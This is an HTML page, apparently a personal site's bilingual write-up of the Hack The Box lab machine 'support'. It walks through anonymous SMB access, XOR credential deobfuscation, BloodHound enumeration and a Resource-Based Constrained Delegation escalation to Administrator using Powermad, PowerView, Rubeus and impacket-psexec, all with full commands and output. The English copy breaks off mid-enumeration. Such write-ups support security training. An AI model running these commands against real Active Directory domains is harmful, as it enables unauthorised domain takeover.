@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>support | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">support</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo era un Domain Controller de Windows que exponía un recurso compartido SMB accesible sin autenticación. En este recurso se encontraba un ejecutable personalizado (<code>UserInfo.exe</code>) que contenía credenciales LDAP ofuscadas mediante operaciones XOR con una clave estática.</p>
+                    
+                    <p>Tras recuperar y desofuscar estas credenciales mediante análisis del binario .NET con dnSpy, obtuve acceso al servicio LDAP del dominio. Utilizando BloodHound para enumerar la estructura del Active Directory, descubrí que el usuario <code>support</code> tenía credenciales almacenadas en el campo <code>info</code> de LDAP y permisos <code>GenericAll</code> sobre el objeto del Domain Controller.</p>
+                    
+                    <p>La escalada de privilegios se realizó mediante un ataque de Resource-Based Constrained Delegation (RBCD). Aprovechando el permiso <code>GenericAll</code> y el valor por defecto de <code>ms-ds-machineaccountquota</code>, creé una cuenta de máquina falsa en el dominio y configuré el atributo <code>msds-allowedtoactonbehalfofotheridentity</code> del DC para que confiase en ella. Posteriormente, utilicé Rubeus para solicitar un ticket Kerberos TGS mediante S4U2Self/S4U2Proxy, suplantando al usuario <code>Administrator</code> y obteniendo acceso completo al sistema.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Enumeración SMB sin autenticación, análisis de binarios .NET con dnSpy, desofuscación XOR, enumeración LDAP/Active Directory, BloodHound, Resource-Based Constrained Delegation (RBCD), abuso de permisos GenericAll, Kerberos S4U2Self/S4U2Proxy, Rubeus, Impacket psexec.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Como primera máquina Windows que abordo, procedo siguiendo una metodología estructurada. Comienzo con un escaneo de nmap para identificar servicios activos:</p>
+                <p><img src="./media/image5.png" alt="Escaneo de nmap mostrando múltiples puertos abiertos incluyendo Kerberos, DNS, LDAP y SMB" /></p>
+
+                <p>El escaneo revela varios servicios críticos de Active Directory. La presencia simultánea de Kerberos (puerto 88), DNS (puerto 53) y LDAP (puertos 389, 3268, 3269) indica inequívocamente que estamos ante un Domain Controller (DC).</p>
+
+                <p>En la información del servicio detecto el hostname <code>DC</code>, lo que sugiere que es un subdominio. Añado tanto <code>dc.support.htb</code> como <code>support.htb</code> al archivo <code>/etc/hosts</code> para la correcta resolución de nombres.</p>
+
+                <h2>Enumeración LDAP - Recopilación de Contextos</h2>
+                <p>Utilizo <code>ldapsearch</code> para consultar los naming contexts del directorio LDAP:</p>
+                <pre><code class="language-bash">ldapsearch -H ldap://support.htb -x -s base namingcontexts</code></pre>
+
+                <p>La respuesta confirma la estructura del dominio:</p>
+                <pre><code class="language-ldif">dn:
+namingcontexts: DC=support,DC=htb
+namingcontexts: CN=Configuration,DC=support,DC=htb
+namingcontexts: CN=Schema,CN=Configuration,DC=support,DC=htb
+namingcontexts: DC=DomainDnsZones,DC=support,DC=htb
+namingcontexts: DC=ForestDnsZones,DC=support,DC=htb</code></pre>
+
+                <p>Intento enumerar objetos del dominio con una búsqueda más profunda:</p>
+                <pre><code class="language-bash">ldapsearch -H ldap://support.htb -x -b "DC=support,DC=htb"</code></pre>
+
+                <p>Sin embargo, LDAP rechaza la consulta con el error <code>Operations error</code>, indicando que es necesario autenticarse mediante un bind exitoso antes de poder enumerar objetos del directorio:</p>
+                <pre><code class="language-plaintext">result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A5A, comment: In order to perform this operation a successful bind must be completed on the connection.</code></pre>
+
+                <h3>Parámetros de ldapsearch</h3>
+                <p>Los parámetros utilizados tienen el siguiente significado:</p>
+                <ul>
+                    <li><code>-s</code>: Scope o alcance de búsqueda (base, one, sub o children)</li>
+                    <li><code>-x</code>: Utilizar autenticación simple</li>
+                    <li><code>-b</code>: Base DN para la búsqueda</li>
+                </ul>
+
+                <h2>Enumeración SMB - Acceso al Recurso Compartido</h2>
+                <p>Pruebo enumerar recursos compartidos SMB con NetExec (anteriormente conocido como CrackMapExec):</p>
+                <pre><code class="language-bash">netexec smb support.htb --shares</code></pre>
+
+                <p>La herramienta identifica el sistema operativo pero falla al enumerar los shares:</p>
+                <pre><code class="language-plaintext">SMB  10.10.11.174  445  DC  [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
+SMB  10.10.11.174  445  DC  [-] Error enumerating shares: STATUS_USER_SESSION_DELETED</code></pre>
+
+                <p>Sin embargo, utilizando <code>smbclient</code> con acceso de invitado (null session) logro listar los recursos compartidos disponibles:</p>
+                <pre><code class="language-bash">smbclient -N -L //support.htb</code></pre>
+
+                <p>El listado muestra varios shares, incluyendo uno personalizado llamado <code>support-tools</code>:</p>
+                <pre><code class="language-plaintext">Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+NETLOGON        Disk      Logon server share
+support-tools   Disk      support staff tools
+SYSVOL          Disk      Logon server share</code></pre>
+
+                <h3>Acceso al Recurso support-tools</h3>
+                <p>Los recursos compartidos estándar <code>NETLOGON</code> y <code>SYSVOL</code> no permiten acceso anónimo. Sin embargo, <code>support-tools</code> sí es accesible sin credenciales:</p>
+                <pre><code class="language-bash">smbclient -N //support.htb/support-tools</code></pre>
+
+                <p>Al listar el contenido encuentro varias herramientas conocidas y un archivo sospechoso:</p>
+                <pre><code class="language-plaintext">7-ZipPortable_21.07.paf.exe         A  2880728
+npp.8.4.1.portable.x64.zip          A  5439245
+putty.exe                           A  1273576
+SysinternalsSuite.zip               A 48102161
+UserInfo.exe.zip                    A   277499
+windirstat1_1_2_setup.exe           A    79171
+WiresharkPortable64_3.6.5.paf.exe  A 44398000</code></pre>
+
+                <p>El archivo <code>UserInfo.exe.zip</code> destaca por ser el único que no corresponde a una herramienta pública conocida. Descargo este archivo para su análisis.</p>
+
+                <h2>Análisis del Ejecutable - Ingeniería Inversa</h2>
+                <p>Tras descomprimir <code>UserInfo.exe.zip</code>, obtengo un ejecutable .NET junto con varias bibliotecas DLL. Para analizar el código, configuro una VM de Windows con VirtualBox y utilizo <a href="https://github.com/dnSpyEx/dnSpy">dnSpy</a>, una herramienta de descompilación y depuración para aplicaciones .NET.</p>
+
+                <p>Durante la exploración del código descompilado, encuentro una clase que maneja credenciales de forma sospechosa:</p>
+                <p><img src="./media/image4.png" alt="Código descompilado de UserInfo.exe mostrando la función de desofuscación de contraseña con operaciones XOR" /></p>
+
+                <p>El código revela que la contraseña está almacenada en formato Base64 y protegida mediante dos operaciones XOR sucesivas:</p>
+                <ol>
+                    <li>XOR con la clave <code>"armando"</code></li>
+                    <li>XOR con el valor <code>223</code></li>
+                </ol>
+
+                <h3>Desofuscación de la Contraseña</h3>
+                <p>Implemento un script Python que invierte las operaciones de ofuscación para recuperar la contraseña en texto plano:</p>
+                <pre><code class="language-python">import base64
+
+enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
+key = b"armando"
+
+# Decodificar base64
+array = base64.b64decode(enc_password)
+
+# Invertir las operaciones XOR (primero XOR 223, luego la clave)
+array2 = bytearray(array)
+for i in range(len(array)):
+    array2[i] = array[i] ^ 223 ^ key[i % len(key)]
+
+# Convertir a string
+password = array2.decode('utf-8')
+print(password)</code></pre>
+
+                <p>El script devuelve la contraseña: <code>nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</code></p>
+
+                <h3>Validación de Credenciales</h3>
+                <p>Verifico que las credenciales son válidas para el usuario <code>ldap</code> utilizando NetExec:</p>
+                <pre><code class="language-bash">netexec smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</code></pre>
+
+                <p>La autenticación tiene éxito, confirmando que las credenciales son correctas:</p>
+                <pre><code class="language-plaintext">SMB  10.10.11.174  445  DC  [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</code></pre>
+
+                <h2>Enumeración de Active Directory con BloodHound</h2>
+                <p>Con credenciales válidas para el dominio, utilizo BloodHound para realizar una enumeración exhaustiva de la estructura del Active Directory y las relaciones de permisos:</p>
+                <pre><code class="language-bash">bloodhound-python -c ALL -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174</code></pre>
+
+                <p>El colector procesa todos los aspectos del dominio:</p>
+                <pre><code class="language-plaintext">INFO: Found AD domain: support.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc.support.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Found 21 users
+INFO: Found 53 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Done in 00M 13S</code></pre>
+
+                <p>Los parámetros utilizados son:</p>
+                <ul>
+                    <li><code>-c ALL</code>: Recolecta toda la información disponible (usuarios, grupos, equipos, permisos, GPOs, etc.)</li>
+                    <li><code>-d</code>: Especifica el dominio objetivo</li>
+                    <li><code>-ns</code>: Define el servidor de nombres a utilizar</li>
+                </ul>
+
+                <p>BloodHound genera 7 archivos JSON con información detallada: computers, containers, domains, gpos, groups, ous y users.</p>
+
+                <h2>Domain Dump con ldapdomaindump</h2>
+                <p>Complemento la enumeración con <code>ldapdomaindump</code> para obtener un volcado completo del directorio en formato más legible:</p>
+                <pre><code class="language-bash">ldapdomaindump -u support.htb\\ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' support.htb -o ldap</code></pre>
+
+                <p>Entre los numerosos datos volcados, destaca un usuario con información sensible en el campo <code>info</code>:</p>
+                <pre><code class="language-json">"info": [
+    "Ironside47pleasure40Watchful"
+]</code></pre>
+
+                <p>Este valor tiene la apariencia de una contraseña. Dada la práctica común de que los administradores almacenen credenciales temporales en campos de comentarios, esto merece investigación.</p>
+
+                <h2>Análisis con BloodHound - Identificación de Permisos Críticos</h2>
+                <p>Inicio la interfaz gráfica de BloodHound e importo los archivos JSON recolectados. Utilizo una consulta Cypher personalizada para analizar las relaciones del usuario <code>support</code>:</p>
+                <pre><code class="language-cypher">MATCH p=(u:User {name:"SUPPORT@SUPPORT.HTB"})-[r*1..2]->(n)
+RETURN p</code></pre>
+
+                <p>El grafo resultante revela información crítica:</p>
+                <p><img src="./media/image3.png" alt="Grafo de BloodHound mostrando que el usuario SUPPORT tiene permisos GenericAll sobre el Domain Controller" /></p>
+
+                <p>El usuario <code>support</code> tiene el permiso <code>GenericAll</code> sobre el objeto del Domain Controller, lo que otorga control completo sobre ese objeto y permite múltiples vectores de escalada de privilegios.</p>
+
+                <h2>Acceso Inicial - WinRM como Usuario support</h2>
+                <p>Antes de explotar los permisos avanzados, verifico si el usuario <code>support</code> con la contraseña encontrada (<code>Ironside47pleasure40Watchful</code>) tiene acceso remoto al sistema:</p>
+                <pre><code class="language-bash">netexec winrm support.htb -u support -p 'Ironside47pleasure40Watchful'</code></pre>
+
+                <p>La respuesta confirma que el usuario tiene privilegios de WinRM con el indicador <code>Pwn3d!</code>:</p>
+                <pre><code class="language-plaintext">WINRM  10.10.11.174  5985  DC  [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
+WINRM  10.10.11.174  5985  DC  [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)</code></pre>
+
+                <p>Me conecto al sistema utilizando Evil-WinRM:</p>
+                <pre><code class="language-bash">evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'</code></pre>
+
+                <p>Obtengo una sesión de PowerShell remota exitosa:</p>
+                <pre><code class="language-plaintext">Evil-WinRM shell v3.7
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\support\Documents></code></pre>
+
+                <p>Navego al escritorio del usuario y recupero la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios - Abuso de GenericAll</h2>
+                <p>Vuelvo a examinar los resultados de BloodHound para planificar la escalada de privilegios. El permiso <code>GenericAll</code> sobre el DC es especialmente poderoso:</p>
+                <p><img src="./media/image1.png" alt="Vista detallada de BloodHound mostrando el permiso GenericAll del usuario SUPPORT sobre DC" /></p>
+
+                <p>El permiso <code>GenericAll</code> permite modificar prácticamente cualquier atributo del objeto del DC, incluyendo el atributo <code>msds-allowedtoactonbehalfofotheridentity</code>, que es la base del ataque Resource-Based Constrained Delegation (RBCD).</p>
+
+                <h3>Preparación de Herramientas</h3>
+                <p>Para realizar el ataque RBCD, necesito varias herramientas de PowerShell y un ejecutable .NET. Subo los siguientes archivos a la máquina víctima:</p>
+                <ul>
+                    <li><strong>PowerView.ps1</strong>: Framework de reconocimiento de AD (<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">enlace</a>)</li>
+                    <li><strong>Powermad.ps1</strong>: Herramienta para crear cuentas de máquina (<a href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1">enlace</a>)</li>
+                    <li><strong>Rubeus.exe</strong>: Herramienta Kerberos para C# (<a href="https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.5_x64">compilado precompilado</a>)</li>
+                </ul>
+
+                <pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\support\Desktop> upload PowerMad.ps1
+*Evil-WinRM* PS C:\Users\support\Desktop> upload PowerView.ps1
+*Evil-WinRM* PS C:\Users\support\Desktop> upload Rubeus.exe</code></pre>
+
+                <p>Cargo los scripts en memoria para poder utilizar sus funciones:</p>
+                <pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\support\Desktop> . .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\support\Desktop> . .\Powermad.ps1</code></pre>
+
+                <h3>Verificación de Cuota de Cuentas de Máquina</h3>
+                <p>Compruebo el valor del atributo <code>ms-ds-machineaccountquota</code>, que determina cuántas cuentas de máquina puede crear un usuario del dominio:</p>
+                <pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\support\Desktop> Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota</code></pre>
+
+                <p>El valor es 10, que es el configurado por defecto en Active Directory:</p>
+                <pre><code class="language-plaintext">ms-ds-machineaccountquota
+-------------------------
+                       10</code></pre>
+
+                <p>Esto significa que puedo crear hasta 10 cuentas de máquina en el dominio sin necesitar privilegios especiales.</p>
+
+                <h3>Creación de Cuenta de Máquina Falsa</h3>
+                <p>Utilizo Powermad para crear una nueva cuenta de máquina con la contraseña <code>asd</code>:</p>
+                <pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\support\Desktop> New-MachineAccount -MachineAccount asd -Password $(ConvertTo-SecureString 'asd' -AsPlainText -Force)</code></pre>
+
+                <p>La cuenta se crea exitosamente:</p>
+                <pre><code class="language-plaintext">[+] Machine account asd added</code></pre>
+
+                <h3>Obtención del SID de la Nueva Máquina</h3>
+                <p>Necesito el SID (Security Identifier) de la máquina recién creada para configurar la delegación:</p>
+                <pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\support\Desktop> $fakesid = Get-DomainComputer asd | select -expand objectsid
+*Evil-WinRM* PS C:\Users\support\Desktop> $fakesid</code></pre>
+
+                <p>El SID asignado es:</p>
+                <pre><code class="language-plaintext">S-1-5-21-1677581083-3380853377-188903654-5602</code></pre>
+
+                <h3>Configuración de Resource-Based Constrained Delegation</h3>
+                <p>El siguiente paso es modificar el atributo <code>msds-allowedtoactonbehalfofotheridentity</code> del DC para que confíe en nuestra máquina falsa. Esto se hace creando un Security Descriptor que otorga permisos completos a nuestra máquina:</p>
+                <pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\support\Desktop> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
+*Evil-WinRM* PS C:\Users\support\Desktop> $SDBytes = New-Object byte[] ($SD.BinaryLength)
+*Evil-WinRM* PS C:\Users\support\Desktop> $SD.GetBinaryForm($SDBytes, 0)
+*Evil-WinRM* PS C:\Users\support\Desktop> Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code></pre>
+
+                <p>Esta configuración permite que nuestra máquina falsa actúe en nombre de otros usuarios cuando se conecte al DC.</p>
+
+                <h3>Verificación con BloodHound</h3>
+                <p>Para confirmar que la configuración se aplicó correctamente, vuelvo a ejecutar el colector de BloodHound y analizo el nuevo grafo:</p>
+                <p><img src="./media/image2.png" alt="Grafo de BloodHound actualizado mostrando que la máquina falsa ASD puede actuar en nombre del DC mediante AllowedToAct" /></p>
+
+                <p>El grafo confirma que la relación <code>AllowedToAct</code> se estableció correctamente entre nuestra máquina falsa y el DC.</p>
+
+                <h3>Generación de Hash RC4 para la Cuenta de Máquina</h3>
+                <p>Para solicitar tickets Kerberos en nombre de nuestra máquina falsa, necesito el hash NTLM de su contraseña. Utilizo Rubeus para calcular el hash:</p>
+                <pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\support\Desktop> .\Rubeus.exe hash /password:asd /user:asd /domain:support.htb</code></pre>
+
+                <p>Rubeus genera varios tipos de hashes:</p>
+                <pre><code class="language-plaintext">[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : asd
+[*] Input username             : asd
+[*] Input domain               : support.htb
+[*] Salt                       : SUPPORT.HTBasd
+[*]       rc4_hmac             : EF8D80B784540A0EC71A1FC853985619
+[*]       aes128_cts_hmac_sha1 : C25CC9853D0BDB97E48ADC22EE42F298
+[*]       aes256_cts_hmac_sha1 : 03583D8E1BD4215117451F3BF965334FFFACF385F7FBC5C7F1F593C7911C45ED
+[*]       des_cbc_md5          : 45BC13B9155DEFB6</code></pre>
+
+                <p>El hash RC4 (NTLM) que necesito es: <code>EF8D80B784540A0EC71A1FC853985619</code></p>
+
+                <h3>Solicitud de Ticket de Servicio mediante S4U</h3>
+                <p>Ahora utilizo Rubeus para realizar un ataque S4U2Self y S4U2Proxy. Este ataque solicita un ticket de servicio (TGS) para el servicio CIFS del DC, suplantando al usuario Administrator:</p>
+                <pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\support\Desktop> .\Rubeus.exe s4u /user:asd /rc4:EF8D80B784540A0EC71A1FC853985619 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt</code></pre>
+
+                <p>El parámetro <code>/ptt</code> (Pass The Ticket) intentaría inyectar el ticket directamente en la sesión, pero dado que estamos en una sesión de WinRM, este enfoque no funcionará directamente. En su lugar, Rubeus genera tres tickets en formato Base64, siendo el último el ticket de servicio final que necesitamos.</p>
+
+                <h3>Conversión del Ticket a Formato ccache</h3>
+                <p>Para utilizar el ticket desde mi máquina atacante Kali Linux, necesito convertirlo del formato <code>.kirbi</code> (Kerberos de Windows) al formato <code>.ccache</code> (utilizado por las herramientas de Linux).</p>
+
+                <p>Copio el último ticket Base64 generado por Rubeus, lo guardo en un archivo y lo decodifico:</p>
+                <pre><code class="language-bash">base64 -d ticket.kirbi.b64 > ticket.kirbi</code></pre>
+
+                <p>Luego utilizo <code>ticketConverter.py</code> de Impacket para convertir el formato:</p>
+                <pre><code class="language-bash">python3 ticketConverter.py ticket.kirbi ticket.ccache</code></pre>
+
+                <p>La conversión se completa exitosamente:</p>
+                <pre><code class="language-plaintext">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] converting kirbi to ccache...
+[+] done</code></pre>
+
+                <h3>Acceso como Administrator mediante psexec</h3>
+                <p>Con el ticket en formato ccache, puedo utilizarlo para autenticarme como Administrator. Configuro la variable de entorno <code>KRB5CCNAME</code> para que apunte a mi ticket y utilizo <code>impacket-psexec</code>:</p>
+                <pre><code class="language-bash">KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass</code></pre>
+
+                <p>Los parámetros indican:</p>
+                <ul>
+                    <li><code>-k</code>: Utilizar autenticación Kerberos</li>
+                    <li><code>-no-pass</code>: No solicitar contraseña (usar el ticket)</li>
+                </ul>
+
+                <p>Psexec se conecta exitosamente al DC como Administrator:</p>
+                <pre><code class="language-plaintext">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Requesting shares on dc.support.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file GhfjxMaI.exe
+[*] Opening SVCManager on dc.support.htb.....
+[*] Creating service rLGi on dc.support.htb.....
+[*] Starting service rLGi.....
+[!] Press help for extra shell commands
+
+Microsoft Windows [Version 10.0.20348.859]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32></code></pre>
+
+                <p>Tengo una shell de SYSTEM en el Domain Controller. Navego al escritorio de Administrator y recupero la flag de root, completando la máquina.</p>
+            </div>
+
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was a Windows Domain Controller that exposed an SMB share accessible without authentication. This share contained a custom executable (<code>UserInfo.exe</code>) that held obfuscated LDAP credentials using XOR operations with a static key.</p>
+                    
+                    <p>After recovering and deobfuscating these credentials through .NET binary analysis with dnSpy, I gained access to the domain's LDAP service. Using BloodHound to enumerate the Active Directory structure, I discovered that the <code>support</code> user had credentials stored in the LDAP <code>info</code> field and <code>GenericAll</code> permissions over the Domain Controller object.</p>
+                    
+                    <p>Privilege escalation was achieved through a Resource-Based Constrained Delegation (RBCD) attack. Leveraging the <code>GenericAll</code> permission and the default <code>ms-ds-machineaccountquota</code> value, I created a fake machine account in the domain and configured the DC's <code>msds-allowedtoactonbehalfofotheridentity</code> attribute to trust it. Subsequently, I used Rubeus to request a Kerberos TGS ticket via S4U2Self/S4U2Proxy, impersonating the <code>Administrator</code> user and obtaining full system access.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Unauthenticated SMB enumeration, .NET binary analysis with dnSpy, XOR deobfuscation, LDAP/Active Directory enumeration, BloodHound, Resource-Based Constrained Delegation (RBCD), GenericAll permission abuse, Kerberos S4U2Self/S4U2Proxy, Rubeus, Impacket psexec.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>As my first Windows machine, I proceed following a structured methodology. I begin with an nmap scan to identify active services:</p>
+                <p><img src="./media/image5.png" alt="Nmap scan showing multiple open ports including Kerberos, DNS, LDAP and SMB" /></p>
+
+                <p>The scan reveals several critical Active Directory services. The simultaneous presence of Kerberos (port 88), DNS (port 53), and LDAP (ports 389, 3268, 3269) unequivocally indicates we're dealing with a Domain Controller (DC).</p>
+
+                <p>In the service information, I detect the hostname <code>DC</code>, suggesting it's a subdomain. I add both <code>dc.support.htb</code> and <code>support.htb</code> to the <code>/etc/hosts</code> file for proper name resolution.</p>
+
+                <h2>LDAP Enumeration - Gathering Naming Contexts</h2>
+                <p>I use <code>ldapsearch</code> to query the LDAP directory's naming contexts:</p>
+                <pre><code class="language-bash">ldapsearch -H ldap://support.htb -x -s base namingcontexts</code></pre>
+
+                <p>The response confirms the domain structure:</p>
+                <pre><code class="language-ldif">dn:
+namingcontexts: DC=support,DC=htb
+namingcontexts: CN=Configuration,DC=support,DC=htb
+namingcontexts: CN=Schema,CN=Configuration,DC=support,DC=htb
+namingcontexts: DC=DomainDnsZones,DC=support,DC=htb
+namingcontexts: DC=ForestDnsZones,DC=support,DC=htb</code></pre>
+
+                <p>I attempt to enumerate domain objects with a deeper search:</p>
+                <pre><code class="language-bash">ldapsearch -H ldap://support.htb -x -b "DC=support,DC=htb"</code></pre>
+
+                <p>However, LDAP rejects the query with an <code>Operations error</code>, indicating that authentication via a successful bind is required before enumerating directory objects:</p>
+                <pre><code class="language-plaintext">result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A5A, comment: In order to perform this operation a successful bind must be completed on the connection.</code></pre>
+
+                <h3>ldapsearch Parameters</h3>
+                <p>The parameters used have the following meaning:</p>
+                <ul>
+                    <li><code>-s</code>: Search scope (base, one, sub, or children)</li>
+                    <li><code>-x</code>: Use simple authentication</li>
+                    <li><code>-b</code>: Base DN for the search</li>
+                </ul>
+
+                <h2>SMB Enumeration - Share Access</h2>
+                <p>I try to enumerate SMB shares with NetExec (formerly known as CrackMapExec):</p>
+                <pre><code class="language-bash">netexec smb support.htb --shares</code></pre>
+
+                <p>The tool identifies the operating system but fails to enumerate the shares:</p>
+                <pre><code class="language-plaintext">SMB  10.10.11.174  445  DC  [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
+SMB  10.10.11.174  445  DC  [-] Error enumerating shares: STATUS_USER_SESSION_DELETED</code></pre>
+
+                <p>However, using <code>smbclient</code> with guest access (null session), I successfully list the available shares:</p>
+                <pre><code class="language-bash">smbclient -N -L //support.htb</code></pre>
+
+                <p>The listing shows several shares, including a custom one called <code>support-tools</code>:</p>
+                <pre><code class="language-plaintext">Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+NETLOGON        Disk      Logon server share
+support-tools   Disk      support staff tools
+SYSVOL          Disk      Logon server share</code></pre>
+
+                <h3>Accessing the support-tools Share</h3>
+                <p>The standard <code>NETLOGON</code> and <code>SYSVOL</code> shares don't allow anonymous access. However, <code>support-tools</code> is accessible without credentials:</p>
+                <pre><code class="language-bash">smbclient -N //support.htb/support-tools</code></pre>
+
+                <p>Listing the contents reveals several known tools and one suspicious file:</p>
+                <pre><code class="language-plaintext">7-ZipPortable_21.07.paf.exe         A  2880728
+npp.8.4.1.portable.x64.zip          A  5439245
+putty.exe                           A  1273576
+SysinternalsSuite.zip               A 48102161
+UserInfo.exe.zip                    A   277499
+windirstat1_1_2_setup.exe           A    79171
+WiresharkPortable64_3.6.5.paf.exe  A 44398000</code></pre>
+
+                <p>The file <code>UserInfo.exe.zip</code> stands out as the only one not corresponding to a known public tool. I download this file for analysis.</p>
+
+                <h2>Executable Analysis - Reverse Engineering</h2>
+                <p>After decompressing <code>UserInfo.exe.zip</code>, I obtain a .NET executable along with several DLL libraries. To analyze the code, I set up a Windows VM with VirtualBox and use <a href="https://github.com/dnSpyEx/dnSpy">dnSpy</a>, a decompilation and debugging tool for .NET applications.</p>
+
+                <p>While exploring the decompiled code, I find a class that handles credentials suspiciously:</p>
+                <p><img src="./media/image4.png" alt="Decompiled code from UserInfo.exe showing the password deobfuscation function with XOR operations" /></p>
+
+                <p>The code reveals that the password is stored in Base64 format and protected by two successive XOR operations:</p>
+                <ol>
+                    <li>XOR with the key <code>"armando"</code></li>
+                    <li>XOR with the value <code>223</code></li>
+                </ol>
+
+                <h3>Password Deobfuscation</h3>
+                <p>I implement a Python script that reverses the obfuscation operations to recover the plaintext password:</p>
+                <pre><code class="language-python">import base64
+
+enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
+key = b"armando"
+
+# Decode base64
+array = base64.b64decode(enc_password)
+
+# Reverse the XOR operations (first XOR 223, then the key)
+array2 = bytearray(array)
+for i in range(len(array)):
+    array2[i] = array[i] ^ 223 ^ key[i % len(key)]
+
+# Convert to string
+password = array2.decode('utf-8')
+print(password)</code></pre>
+
+                <p>The script returns the password: <code>nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</code></p>
+
+                <h3>Credential Validation</h3>
+                <p>I verify that the credentials are valid for the <code>ldap</code> user using NetExec:</p>
+                <pre><code class="language-bash">netexec smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</code></pre>
+
+                <p>Authentication succeeds, confirming the credentials are correct:</p>
+                <pre><code class="language-plaintext">SMB  10.10.11.174  445  DC  [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</code></pre>
+
+                <h2>Active Directory Enumeration with BloodHound</h2>
+                <p>With valid domain credentials, I use BloodHound to perform comprehensive enumeration of the Active Directory structure and permission relationships:</p>
+                <pre><code class="language-bash">bloodhound-python -c ALL -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174</code></pre>
+
+                <p>The collector processes all aspects of the domain:</p>
+                <pre><code class="language-plaintext">INFO: Found AD domain: support.htb
+INFO: Getting TGT for user
